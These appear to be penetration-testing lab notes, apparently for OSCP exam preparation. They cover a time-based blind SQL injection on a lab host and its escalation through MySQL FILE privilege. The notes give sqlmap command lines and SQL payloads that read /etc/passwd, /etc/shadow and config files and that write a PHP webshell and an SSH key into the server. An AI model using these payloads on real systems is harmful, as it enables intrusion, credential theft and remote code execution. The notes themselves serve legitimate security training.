# SQLMap Enumeration Results - Complete Analysis
**Date**: 2025-10-01
**Target**: 192.168.145.48
**Injection Point**: mail-list (POST)
**Type**: Time-based Blind SQL Injection

## Summary of SQLMap Scan Attempts

### Directories Created
- `sqlmap_results/` - Initial database enumeration
- `sqlmap_results_2/` - Secondary enumeration attempt
- `sqlmap_results_focusd/` - Focused extraction attempt
- `sqlmap_results_schema/` - Schema enumeration
- `sqlmap_user_audit/` - User privilege enumeration
- `sqlmap_file_check/` - FILE privilege verification
- `sqlmap_shell_test/` - OS command execution testing
- `subscribers_dump/` - Data extraction attempt (failed due to time constraints)

## Critical Discoveries

### 1. Database User Identified
**User**: `gollum@localhost`
- Extracted via CURRENT_USER() query
- Time-based extraction using ASCII binary search
- Confirmed through multiple scan attempts

### 2. FILE Privilege Confirmed ⚠️
**Critical Finding**: The `gollum` user has FILE privilege!

**Verification Query**:
```sql
SELECT privilege_type FROM information_schema.user_privileges
WHERE grantee LIKE '%gollum%' AND privilege_type='FILE'
```
**Result**: FILE privilege CONFIRMED

### 3. Database Structure
```
Databases:
├── information_schema (system)
└── animal_planet (current/target)
    └── subscribers (table)
```

## Exploitation Capabilities

### With FILE Privilege, `gollum` Can:

1. **Read Files from Server**
   ```sql
   -- Read system files
   SELECT LOAD_FILE('/etc/passwd');
   SELECT LOAD_FILE('/var/www/html/config.php');
   ```

2. **Write Files to Server** (if writable directories exist)
   ```sql
   -- Write webshell
   SELECT '<?php system($_GET["cmd"]); ?>'
   INTO OUTFILE '/var/www/html/shell.php';

   -- Write SSH key
   SELECT 'ssh-rsa AAAA...'
   INTO OUTFILE '/home/user/.ssh/authorized_keys';
   ```

3. **Potential Attack Vectors**
   - Configuration file disclosure
   - Source code extraction
   - Webshell deployment
   - Log poisoning
   - Credential harvesting from config files

## Technical Constraints

### Time-Based Blind Limitations
- **Extraction Speed**: ~2.5 seconds per character
- **Full Table Dump**: Impractical (would take hours)
- **Privilege Enumeration**: Each check requires multiple queries
- **File Operations**: Each byte requires timing confirmation

### SQLMap Performance
- **40 requests** just to confirm injection point
- **300+ seconds** to extract username
- **Empty** subscribers_dump due to time constraints
- Manual extraction scripts created as workaround

## Commands Used

### User Enumeration
```bash
sqlmap -u http://192.168.145.48/index.php \
  --data=mail-list=test@test.com \
  --dbms=mysql --technique=T --batch \
  --users --passwords --privileges --roles \
  --output-dir=./sqlmap_user_audit
```

### FILE Privilege Check
```bash
sqlmap -u http://192.168.145.48/index.php \
  --data=mail-list=test@test.com \
  --dbms=mysql --technique=T \
  --sql-query="SELECT privilege_type FROM information_schema.user_privileges WHERE grantee LIKE '%gollum%' AND privilege_type='FILE'" \
  --output-dir=./sqlmap_file_check
```

## Next Steps for Exploitation

1. **Enumerate Writable Directories**
   ```sql
   SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/html/test.php';
   -- If successful, webshell deployment possible
   ```

2. **Extract Sensitive Files**
   ```sql
   SELECT LOAD_FILE('/etc/shadow');  -- If readable
   SELECT LOAD_FILE('/var/www/html/wp-config.php');  -- Config files
   ```

3. **Alternative to Slow Extraction**
   - Use FILE privilege to write extraction results to readable location
   - Access written files directly via web browser

## OSCP Exam Relevance

### Key Takeaways:
1. **Privilege Escalation Path**: FILE privilege can lead to RCE
2. **Manual Method Required**: Time-based blind too slow for exam
3. **Critical Finding**: Always check user privileges, not just data
4. **Attack Chain**: SQLi → FILE → Webshell → System Access

### Time Investment:
- SQLMap enumeration: ~30 minutes
- Manual verification: Would take 2-3 hours
- FILE privilege discovery: **Game-changing** for exploitation path

## Documentation References
- Initial discovery: `02_sqli_breakthrough.md`
- Manual extraction: `sqli_extraction_log.md`
- Extraction scripts: `../extraction_scripts.sh`
- Investigation checklist: `../investigation_checklist.md`